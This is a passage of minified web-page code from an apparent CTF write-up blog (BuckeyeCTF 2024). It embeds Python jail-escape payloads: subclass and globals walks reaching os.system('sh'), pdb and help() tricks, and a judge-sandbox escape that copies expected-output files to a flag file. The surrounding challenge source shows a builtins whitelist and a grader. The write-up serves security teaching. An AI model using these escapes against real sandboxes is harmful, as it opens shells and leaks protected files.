<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code>`,Gc,Is,bp,vk,Vc,N,yp,P,Ek,gp,Ot,Ft,hk,xk,wp,H,Ck,vp,Rt,It,Lk,$c,Ds,Ep,Tk,Jc,f,U,Dt,Ak,Ok,jt,Fk,Rk,hp,xp,Nt,Ik,Dk,jk,Cp,Pt,Nk,W,Ht,Ut,Pk,Hk,Mt,St,Uk,Mk,Lp,Bt,Sk,C,qt,zt,Bk,qk,Wt,Yt,zk,Wk,Gt,Vt,Yk,Gk,Tp,$t,Vk,L,Jt,Kt,$k,Jk,Zt,Xt,Kk,Zk,Qt,so,Xk,Qk,Ap,no,si,Op,ao,po,ni,ai,Fp,to,pi,T,oo,eo,ti,oi,co,lo,ei,ci,uo,ro,li,ui,js,ko,ri,ki,Y,Rp,io,ii,Ip,_o,fo,_i,di,Dp,mo,fi,jp,bo,yo,mi,Kc,Ns,Np,bi,Zc,Ps,go,Xc,Hs,wo,vo,yi,Qc,Us,u2='<code class="language-py">https<span class="token punctuation">:</span><span class="token operator">//</span>ctf<span class="token punctuation">.</span>gg<span class="token operator">/</span>blog<span class="token operator">/</span>buckeyectf<span class="token operator">-</span><span class="token number">2024</span><span class="token operator">/</span>gentleman</code>',sl,Ms,Pp,gi,nl,Ss,Eo,ho,wi,al,Bs,r2=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code <span class="token operator">:=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"jail> "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token keyword">and</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span><span class="token string">r'([^()]|())*'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">":("</span><span class="token punctuation">)</span></code>`,pl,qs,xo,Co,vi,tl,zs,k2=`<code class="language-py"><span class="token comment"># @Ark - rerun w/ help while adding pdb to loaded sys modules</span>
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
pdb
jail
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"pdb"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_trace<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat /flag-*.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># @maple3142 - overwrite dunder to call breakpoint</span>
<span class="token punctuation">[</span>c<span class="token operator">:=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token operator">:=</span>c<span class="token punctuation">.</span>copy<span class="token punctuation">.</span>__builtins__<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span>c<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> c<span class="token punctuation">.</span>items <span class="token keyword">in</span><span class="token punctuation">[</span>b<span class="token punctuation">[</span><span class="token string">'breakpoint'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @nagi - calls code.interact() from object.__subclasses__ after triggering pydoc once w/ module containing code.InteractiveInterpreter</span>
<span class="token punctuation">[</span>s<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">,</span>s<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>s<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"interact"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
code
q

<span class="token comment"># @keymoon - retrieve help from &lt;class 'enum._EnumDict'></span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>update<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'bltns'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system</span>

<span class="token comment"># @SuperFashi / @ierae - retrieve help from &lt;class '_sitebuiltins._Helper'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system</span></code>`,ol,Ws,Hp,Ei,el,Ys,Lo,To,hi,cl,Gs,i2=`<code class="language-py">builtins_whitelist <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span>
        <span class="token string">"RuntimeError"</span><span class="token punctuation">,</span>
        <span class="token string">"Exception"</span><span class="token punctuation">,</span>
        <span class="token string">"KeyboardInterrupt"</span><span class="token punctuation">,</span>
        <span class="token string">"False"</span><span class="token punctuation">,</span>
        <span class="token string">"None"</span><span class="token punctuation">,</span>
        <span class="token string">"True"</span><span class="token punctuation">,</span>
        <span class="token string">"bytearray"</span><span class="token punctuation">,</span>
        <span class="token string">"bytes"</span><span class="token punctuation">,</span>
        <span class="token string">"dict"</span><span class="token punctuation">,</span>
        <span class="token string">"float"</span><span class="token punctuation">,</span>
        <span class="token string">"int"</span><span class="token punctuation">,</span>
        <span class="token string">"list"</span><span class="token punctuation">,</span>
        <span class="token string">"object"</span><span class="token punctuation">,</span>
        <span class="token string">"set"</span><span class="token punctuation">,</span>
        <span class="token string">"str"</span><span class="token punctuation">,</span>
        <span class="token string">"tuple"</span><span class="token punctuation">,</span>
        <span class="token string">"abs"</span><span class="token punctuation">,</span>
        <span class="token string">"all"</span><span class="token punctuation">,</span>
        <span class="token string">"any"</span><span class="token punctuation">,</span>
        <span class="token string">"apply"</span><span class="token punctuation">,</span>
        <span class="token string">"bin"</span><span class="token punctuation">,</span>
        <span class="token string">"bool"</span><span class="token punctuation">,</span>
        <span class="token string">"buffer"</span><span class="token punctuation">,</span>
        <span class="token string">"callable"</span><span class="token punctuation">,</span>
        <span class="token string">"chr"</span><span class="token punctuation">,</span>
        <span class="token string">"classmethod"</span><span class="token punctuation">,</span>
        <span class="token string">"cmp"</span><span class="token punctuation">,</span>
        <span class="token string">"coerce"</span><span class="token punctuation">,</span>
        <span class="token string">"compile"</span><span class="token punctuation">,</span>
        <span class="token string">"delattr"</span><span class="token punctuation">,</span>
        <span class="token string">"dir"</span><span class="token punctuation">,</span>
        <span class="token string">"divmod"</span><span class="token punctuation">,</span>
        <span class="token string">"enumerate"</span><span class="token punctuation">,</span>
        <span class="token string">"filter"</span><span class="token punctuation">,</span>
        <span class="token string">"format"</span><span class="token punctuation">,</span>
        <span class="token string">"hasattr"</span><span class="token punctuation">,</span>
        <span class="token string">"hash"</span><span class="token punctuation">,</span>
        <span class="token string">"hex"</span><span class="token punctuation">,</span>
        <span class="token string">"id"</span><span class="token punctuation">,</span>
        <span class="token string">"input"</span><span class="token punctuation">,</span>
        <span class="token string">"isinstance"</span><span class="token punctuation">,</span>
        <span class="token string">"issubclass"</span><span class="token punctuation">,</span>
        <span class="token string">"iter"</span><span class="token punctuation">,</span>
        <span class="token string">"len"</span><span class="token punctuation">,</span>
        <span class="token string">"map"</span><span class="token punctuation">,</span>
        <span class="token string">"max"</span><span class="token punctuation">,</span>
        <span class="token string">"min"</span><span class="token punctuation">,</span>
        <span class="token string">"next"</span><span class="token punctuation">,</span>
        <span class="token string">"oct"</span><span class="token punctuation">,</span>
        <span class="token string">"open"</span><span class="token punctuation">,</span>
        <span class="token string">"ord"</span><span class="token punctuation">,</span>
        <span class="token string">"pow"</span><span class="token punctuation">,</span>
        <span class="token string">"print"</span><span class="token punctuation">,</span>
        <span class="token string">"property"</span><span class="token punctuation">,</span>
        <span class="token string">"range"</span><span class="token punctuation">,</span>
        <span class="token string">"reduce"</span><span class="token punctuation">,</span>
        <span class="token string">"repr"</span><span class="token punctuation">,</span>
        <span class="token string">"reversed"</span><span class="token punctuation">,</span>
        <span class="token string">"round"</span><span class="token punctuation">,</span>
        <span class="token string">"setattr"</span><span class="token punctuation">,</span>
        <span class="token string">"slice"</span><span class="token punctuation">,</span>
        <span class="token string">"sorted"</span><span class="token punctuation">,</span>
        <span class="token string">"staticmethod"</span><span class="token punctuation">,</span>
        <span class="token string">"sum"</span><span class="token punctuation">,</span>
        <span class="token string">"super"</span><span class="token punctuation">,</span>
        <span class="token string">"unichr"</span><span class="token punctuation">,</span>
        <span class="token string">"xrange"</span><span class="token punctuation">,</span>
        <span class="token string">"zip"</span><span class="token punctuation">,</span>
        <span class="token string">"len"</span><span class="token punctuation">,</span>
        <span class="token string">"sort"</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">ReadOnlyBuiltins</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__delitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">popitem</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">setdefault</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_safe_open</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">safe_open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> mode <span class="token operator">!=</span> <span class="token string">"r"</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>submission_id <span class="token operator">+</span> <span class="token string">".expected"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safe_open

<span class="token keyword">class</span> <span class="token class-name">Sandbox</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> sys
        <span class="token keyword">from</span> ctypes <span class="token keyword">import</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object

        _get_dict <span class="token operator">=</span> pythonapi<span class="token punctuation">.</span>_PyObject_GetDictPtr
        _get_dict<span class="token punctuation">.</span>restype <span class="token operator">=</span> POINTER<span class="token punctuation">(</span>py_object<span class="token punctuation">)</span>
        _get_dict<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>py_object<span class="token punctuation">]</span>
        <span class="token keyword">del</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object

        <span class="token keyword">def</span> <span class="token function">dictionary_of</span><span class="token punctuation">(</span>ob<span class="token punctuation">)</span><span class="token punctuation">:</span>
            dptr <span class="token operator">=</span> _get_dict<span class="token punctuation">(</span>ob<span class="token punctuation">)</span>
            <span class="token keyword">return</span> dptr<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value
        type_dict <span class="token operator">=</span> dictionary_of<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span>
        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__bases__"</span><span class="token punctuation">]</span>
        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span>
        original_builtins <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__
        original_builtins<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _safe_open<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span>
        <span class="token keyword">for</span> builtin <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> builtin <span class="token keyword">not</span> <span class="token keyword">in</span> builtins_whitelist<span class="token punctuation">:</span>
                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>builtin<span class="token punctuation">]</span>
        safe_builtins <span class="token operator">=</span> ReadOnlyBuiltins<span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span> <span class="token operator">=</span> safe_builtins
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file__
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__loader__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__loader__
        <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span>
            <span class="token string">"__loader__"</span><span class="token punctuation">,</span>
            <span class="token string">"__spec__"</span><span class="token punctuation">,</span>
            <span class="token string">"origin"</span><span class="token punctuation">,</span>
            <span class="token string">"__file__"</span><span class="token punctuation">,</span>
            <span class="token string">"__cached__"</span><span class="token punctuation">,</span>
            <span class="token string">"ReadOnlyBuiltins"</span><span class="token punctuation">,</span>
            <span class="token string">"Sandbox"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> key <span class="token keyword">in</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>
                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>key<span class="token punctuation">]</span></code>`,ll,Vs,Ao,Oo,xi,ul,$s,_2=`<code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit/&lt;problem_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">32768</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment"># Prepare code</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__import__("sandbox").Sandbox("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">")&#92;n'</span></span> <span class="token operator">+</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment"># Set up input and output files</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span>output<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Run code</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u nobody -g nogroup python3 /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py &lt; /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in > /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> proc<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
        skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
        submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        diff <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'diff /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> diff<span class="token punctuation">.</span>stdout<span class="token punctuation">:</span>
            submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
            skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Accepted'</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>`,rl,Js,Fo,Ro,Ci,kl,Ks,d2=`<code class="language-py"><span class="token comment"># @Starlight - retrieve open from closure</span>
<span class="token builtin">open</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__closure__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cell_contents
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__
io<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'sys'</span>
sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span>io<span class="token punctuation">.</span>__spec__<span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">' '</span> <span class="token keyword">not</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/*.expected > /tmp/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
